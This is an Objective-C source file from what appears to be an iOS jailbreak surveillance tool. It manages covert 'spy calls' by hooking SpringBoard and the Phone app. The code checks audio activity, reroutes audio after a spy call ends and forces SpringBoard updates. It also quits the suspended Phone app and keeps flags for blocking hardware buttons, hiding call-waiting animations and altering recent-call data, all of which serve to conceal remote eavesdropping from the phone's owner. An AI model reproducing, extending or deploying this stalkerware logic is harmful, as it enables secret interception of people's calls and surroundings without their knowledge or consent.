//
//  SystemEnvironmentUtils.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SystemEnvironmentUtils.h"
#import "SpyCallUtils.h"
#import "FxCall.h"
#import "SpyCallManager.h"
#import "AudioHelper.h"
#import "AVController.h"
#import "AVController+iOS8.h"
#import "AudioActiveInfo.h"
#import "SharedFileIPC.h"
#import "DefStd.h"

#import "SpringBoard.h"
#import "SpringBoard+iOS8.h"
#import "SBTelephonyManager.h"
#import "SBApplicationController.h"
#import "SBApplicationController+iOS8.h"
#import "SBApplication.h"
#import "SBApplication+IOS6.h"
#import "SBApplication+IOS7.h"
#import "SBApplication+iOS9.h"
#import "SBDisplayItem.h"
#import "SBMainSwitcherViewController.h"

#import <objc/runtime.h>

@interface SystemEnvironmentUtils (private)

- (void) createAVControllor;
- (void) printAudioCategory;

@end


@implementation SystemEnvironmentUtils

@synthesize mBlockLockButtonUp;
@synthesize mBlockMenuButtonUp;
@synthesize mBlockAnimateOutCallWaiting;
@synthesize mForceRecentCallDataChange;
@synthesize mMissedCall;

@synthesize mTelephoneNumberBeforeSpyCallConference;

@synthesize mSpyCallManager;
@synthesize mAVController;

@synthesize mAudioHelper;

- (id) init {
	if ((self = [super init])) {
		mAudioHelper = [AudioHelper sharedAudioHelper];
        
		/********************************************************************************************************************
         Explicitly create AVController because HOOK of init will not call after respring but after make or receive a call;
         then HOOK of init is called, mAVController will set to the one created by SpringBoard.
         ********************************************************************************************************************/
		[self performSelector:@selector(createAVControllor) withObject:self afterDelay:5.00];
	}
	return (self);
}

- (BOOL) isAudioActive {
	BOOL isPlaying = [SpyCallUtils isPlayingAudio];
	BOOL isRecording = [SpyCallUtils isRecordingAudio];
	APPLOGVERBOSE(@"isPlaying = %d, isRecording = %d", isPlaying, isRecording);
	BOOL isAudioActive = (isPlaying || isRecording);
    
    // Check whether phone application is running, because SpringBoard is always running
    BOOL isPhoneRunning = YES;
    if ([SpyCallUtils isSpringBoardHook]) {
        SBApplication *sbPhoneApplication = nil;
        NSString *bundleIdentifier = @"com.apple.mobilephone";
        Class $SBApplicationController = objc_getClass("SBApplicationController");
        SBApplicationController *sbApplicationController = [$SBApplicationController sharedInstance];
        if ([sbApplicationController respondsToSelector:@selector(applicationsWithBundleIdentifier:)]) {
            // Below iOS 8
            sbPhoneApplication = [sbApplicationController applicationsWithBundleIdentifier:bundleIdentifier];
        } else {
            // iOS 8
            sbPhoneApplication = [sbApplicationController applicationWithBundleIdentifier:bundleIdentifier];
        }
        // No this method on iOS 6 downward
        if ([sbPhoneApplication respondsToSelector:@selector(isRunning)]) {
            isPhoneRunning = [sbPhoneApplication isRunning];
        }
        
        // iOS 9
        isPhoneRunning = (isPhoneRunning && ![SpyCallUtils isMobilePhoneProcessSuspend]);
    }
    
    if (isPhoneRunning) {
        SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
        NSData *aaiData = [sFileIPC readDataWithID:kSharedFileAudioActiveID];
        if (aaiData) { // Data exist
            AudioActiveInfo *aai = [[AudioActiveInfo alloc] initWithData:aaiData];
            isAudioActive = [aai mIsAudioActive]; // Reset audio active flag according to first check of either SpringBoard or Mobile Phone
            if (![[aai mBundleID] isEqualToString:[[NSBundle mainBundle] bundleIdentifier]]) {
                [sFileIPC deleteData:kSharedFileAudioActiveID];
            }
            [aai release];
        } else {
            AudioActiveInfo *aai = [[AudioActiveInfo alloc] init];
            [aai setMBundleID:[[NSBundle mainBundle] bundleIdentifier]];
            [aai setMIsAudioActive:isAudioActive];
            [sFileIPC deleteData:kSharedFileAudioActiveID];
            [sFileIPC writeData:[aai toData] withID:kSharedFileAudioActiveID];
            [aai release];
        }
        [sFileIPC release];
        APPLOGVERBOSE(@"aaiData = %@", aaiData);
    }
	APPLOGVERBOSE(@"isAudioActive = %d, isPhoneRunning = %d", isAudioActive, isPhoneRunning);
	return (isAudioActive);
}

- (void) dumpAudioCategory {
	[NSTimer scheduledTimerWithTimeInterval:5.0
                                     target:self
                                   selector:@selector(printAudioCategory)
                                   userInfo:nil
                                    repeats:YES];
}

- (void) dumpAudioRoute {
    Class $SpyCallUtils = [SpyCallUtils class];
    [NSTimer scheduledTimerWithTimeInterval:5.0
                                     target:$SpyCallUtils
                                   selector:@selector(debugAudioRoute)
                                   userInfo:nil
                                    repeats:YES];
}

- (void) spyCallDisconnecting: (FxCall *) aSpyCall {
	if (![aSpyCall mIsSecondarySpyCall]) {
		// Fix SpringBoard update as soon as there is no more call in conference except spy call itself
		if ([SpyCallUtils isSpringBoardHook] && [aSpyCall mIsInConference] && ![mSpyCallManager normalCallCount]) {
			Class $SBTelephonyManager = objc_getClass("SBTelephonyManager");
			[[$SBTelephonyManager sharedTelephonyManager] updateSpringBoard];
		}
		
		APPLOGVERBOSE(@"AVController attribute value = %@", [[self mAVController] attributeForKey:@"AVController_AudioCategoryAttribute"]);
		if ([SpyCallUtils isSpringBoardHook] && [SpyCallUtils isIOS4] &&
			[[[self mAVController] attributeForKey:@"AVController_AudioCategoryAttribute"] isEqualToString:@"PhoneCall"]) {
			// Ask AVController to set audio route to Ringtone thus it will divert to speaker after spy call disconnect
			[SpyCallUtils setAVController:[self mAVController] category:@"Ringtone" transition:1];
		}
	}
}

- (void) spyCallDidCompletelyDisconnected: (FxCall *) aSpyCall {
	if (![aSpyCall mIsSecondarySpyCall]) {
		// To fix SpringBoard update issue when user end conference by press _endCallClicked
		if ([SpyCallUtils isSpringBoardHook] && [aSpyCall mIsInConference] && ![mSpyCallManager normalCallCount]) {
			Class $SBTelephonyManager = objc_getClass("SBTelephonyManager");
			[[$SBTelephonyManager sharedTelephonyManager] updateSpringBoard];
		}
	}
    
    if ([SpyCallUtils isSpringBoardHook]) {
        /*
         - Make sure AVAudioSession isOtherAudioPlaying flag return correctly for incoming spy call after previous spy call disconnect
         - Camera tap in Camear app appear again after spy call disconnect
         */
        APPLOGVERBOSE(@"Make call to endInterupt... to AVController");
        if ([self.mAVController respondsToSelector:@selector(endInterruptionWithStatus:)]) {
            [self.mAVController endInterruptionWithStatus:nil];
        }
        
        if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
            // iOS 9, MobilePhone suspended cause problem of number of normal call and call status are incorrect... if these information is incorrect it will
            // lead to spy call cannot active, join conference when MobilePhone resume from suspend state that's why it's neccessary to quit in its suspend state
            if ([SpyCallUtils isMobilePhoneRunning] && [SpyCallUtils isMobilePhoneProcessSuspend]) {
                Class $SBApplicationController = objc_getClass("SBApplicationController");
                SBApplication *mobilePhone = [[$SBApplicationController sharedInstance] mobilePhone];
                
                Class $SBDisplayItem = objc_getClass("SBDisplayItem");
                SBDisplayItem *sbDisplayItem = [$SBDisplayItem displayItemWithType:@"App" displayIdentifier:[mobilePhone bundleIdentifier]];
                Class $SBMainSwitcherViewController = objc_getClass("SBMainSwitcherViewController");
                SBMainSwitcherViewController *sbMainSwitcher = [$SBMainSwitcherViewController sharedInstance];
                [sbMainSwitcher _quitAppRepresentedByDisplayItem:sbDisplayItem forReason:0];
                
                APPLOGVERBOSE(@"Quit MobilePhone because it's suspend");
            }
        }
    }
}

- (void) createAVControllor {
    APPLOGVERBOSE(@"Creating AVController for mAVController = %@", mAVController);
	if (![self mAVController]) [self setMAVController:[AVController avController]];
	if (![self mAVController]) mAVController = [[AVController alloc] init];
	APPLOGVERBOSE(@"mAVController = %@", [self mAVController]);
}

- (void) printAudioCategory {
	APPLOGVERBOSE(@"AVController attribute value = %@", [[self mAVController] attributeForKey:@"AVController_AudioCategoryAttribute"]);
}

- (void) dealloc {
	[mTelephoneNumberBeforeSpyCallConference release];
	[mAVController release];
	[super dealloc];
}


@end
